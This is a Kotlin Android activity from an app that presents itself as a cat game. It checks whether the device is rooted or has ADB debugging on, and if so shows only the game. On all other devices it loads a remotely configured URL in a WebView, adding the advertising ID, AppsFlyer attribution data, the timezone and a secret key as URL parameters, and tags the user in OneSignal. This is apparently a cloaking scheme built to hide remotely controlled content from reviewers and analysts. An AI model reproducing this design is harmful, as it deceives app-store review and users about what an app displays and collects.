package com.frojo.moy4.androi.activity

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.net.toUri
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerLib
import com.frojo.moy4.androi.R
import com.frojo.moy4.androi.models.DataStructure
import com.frojo.moy4.androi.models.PredefinedParams
import com.frojo.moy4.androi.store.PreferencesStore
import com.frojo.moy4.androi.utils.callbackLiveData
import com.frojo.moy4.androi.utils.dataStore
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.onesignal.OneSignal
import kotlinx.coroutines.*
import java.io.File
import java.util.*

class CatLoadingActivity : AppCompatActivity() {
    private lateinit var predefinedParams: PredefinedParams<String>
    private val rooted: Boolean get() = isRooted()

    @Suppress("BlockingMethodInNonBlockingContext")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_cat_loading)
        if (rooted) {
            startActivity(Intent(this, CatPreGameActivity::class.java))
            finish()
        } else {
            lifecycleScope.launch {
                if (PreferencesStore.empty(dataStore)) {
                    Log.d(TAG, "Fetch new url")
                    fetchRemoteConfig()
                    val gadid = withContext(Dispatchers.Default) {
                        AdvertisingIdClient
                            .getAdvertisingIdInfo(this@CatLoadingActivity).id.toString()
                    }
                    callbackLiveData.observe(this@CatLoadingActivity) { dataStructure ->
                        if (this@CatLoadingActivity::predefinedParams.isInitialized) {
                            val url = createFullUrl(
                                params = predefinedParams,
                                data = dataStructure,
                                gadid = gadid
                            )
                            Log.d(TAG, "New url created: $url")
                            CoroutineScope(Dispatchers.Default + SupervisorJob()).launch {
                                sendTag(
                                    params = predefinedParams,
                                    data = dataStructure,
                                    userId = gadid
                                )
                            }
                            web(url)
                        }
                    }
                } else {
                    val url = PreferencesStore.readFromDataStore(dataStore)
                    Log.d(TAG, "Old url: $url")
                    web(url)
                }
            }
        }
    }

    private fun web(url: String) {
        val intent = Intent(this, CatWebViewActivity::class.java)
        intent.putExtra(CatWebViewActivity.INTENT_EXTRA, url)
        startActivity(intent)
        finish()
    }

    private fun createFullUrl(
        params: PredefinedParams<String>,
        data: DataStructure,
        gadid: String
    ): String {
        val prefix = "https://"
        val url = params.default_url.toUri().buildUpon().apply {
            appendQueryParameter(
                resources.getString(R.string.secure_get_parametr),
                resources.getString(R.string.secure_key)
            )
            appendQueryParameter(
                resources.getString(R.string.dev_tmz_key),
                TimeZone.getDefault().id
            )
            appendQueryParameter(resources.getString(R.string.gadid_key), gadid)
            appendQueryParameter(resources.getString(R.string.deeplink_key), data.deepData)
            appendQueryParameter(
                resources.getString(R.string.source_key),
                data.appData?.get("media_source").toString()
            )
            appendQueryParameter(
                resources.getString(R.string.af_id_key),
                AppsFlyerLib.getInstance().getAppsFlyerUID(this@CatLoadingActivity)
            )
            appendQueryParameter(
                resources.getString(R.string.adset_id_key),
                data.appData?.get("adset_id").toString()
            )
            appendQueryParameter(
                resources.getString(R.string.campaign_id_key),
                data.appData?.get("campaign_id").toString()
            )
            appendQueryParameter(
                resources.getString(R.string.app_campaign_key),
                data.appData?.get("campaign").toString()
            )
            appendQueryParameter(
                resources.getString(R.string.adset_key),
                data.appData?.get("adset").toString()
            )
            appendQueryParameter(
                resources.getString(R.string.adgroup_key),
                data.appData?.get("adgroup").toString()
            )
            appendQueryParameter(
                resources.getString(R.string.orig_cost_key),
                data.appData?.get("orig_cost").toString()
            )
            appendQueryParameter(
                resources.getString(R.string.af_siteid_key),
                data.appData?.get("af_siteid").toString()
            )
        }.toString()
        return prefix + url
    }

    private fun sendTag(params: PredefinedParams<String>, data: DataStructure, userId: String) {
        OneSignal.initWithContext(application)
        OneSignal.setAppId(params.one_signal)
        OneSignal.setExternalUserId(userId)
        val campaign = data.appData?.get("campaign").toString()
        val key = "key2"

        when {
            campaign == "null" && data.deepData == "null" -> {
                OneSignal.sendTag(key, "organic")
            }
            data.deepData != "null" -> {
                OneSignal.sendTag(
                    key,
                    data.deepData!!.replace("myapp://", "").substringBefore("/")
                )
            }
            campaign != "null" -> {
                OneSignal.sendTag(key, campaign.substringBefore("_"))
            }
        }
        Log.d(TAG, "Tag send")
    }

    private fun fetchRemoteConfig() {
        with(Firebase.remoteConfig) {
            setConfigSettingsAsync(remoteConfigSettings {
                minimumFetchIntervalInSeconds = 3600
            })
            setDefaultsAsync(R.xml.remote_config_defaults)
            fetchAndActivate().addOnCompleteListener {
                predefinedParams = PredefinedParams(
                    default_url = getString("default_url"),
                    one_signal = getString("one_signal")
                )
            }
        }
    }

    private fun isRooted(): Boolean {
        fun isRootsEnabled(): Boolean {
            val dirsArray: Array<String> = resources.getStringArray(R.array.dirs_array)
            try {
                for (dir in dirsArray) {
                    if (File(dir + "su").exists()) return true
                }
            } catch (e: SecurityException) {
                e.printStackTrace()
            }
            return false
        }

        fun isADBEnabled(): Boolean {
            return Settings.Global.getString(
                contentResolver,
                Settings.Global.ADB_ENABLED
            ) == "1"
        }
        return isRootsEnabled() || isADBEnabled()
    }

    companion object {
        const val TAG = "YYY"
    }
}